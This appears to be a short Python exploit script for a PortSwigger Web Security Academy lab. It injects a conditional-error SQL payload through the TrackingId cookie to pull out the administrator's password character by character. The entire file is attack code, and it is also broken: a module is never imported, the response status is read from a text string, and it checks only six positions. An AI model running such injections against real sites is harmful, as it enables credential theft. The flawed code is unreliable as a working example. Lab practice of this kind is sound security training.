# burp web sec academy
import requests
import sys
from requests.packages.urllib3.exceptions import InsecureRequestWarning
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

url = sys.argv[1]
chars = list(string.ascii_lowercase+string.digits)
password = ""
result= ""

x = range(1,7)
for i in x:
    for c in chars:
        cookies={'TrackingId':'\'+UNION+SELECT+CASE+WHEN+(username=\'administrator\'+AND+substr(password,%s,1)=\'%s\')+THEN+to_char(1/0)+ELSE+NULL+END+FROM+users--' % (i,password+c)}
        resp = requests.get(url, cookies=cookies).text
        if resp.status_code == 500:
            result+=c
            sys.stdout.write("\r"+"Password: " + result)
            sys.stdout.flush()
            break
        elif c == chars[-1]:
            exit(0)
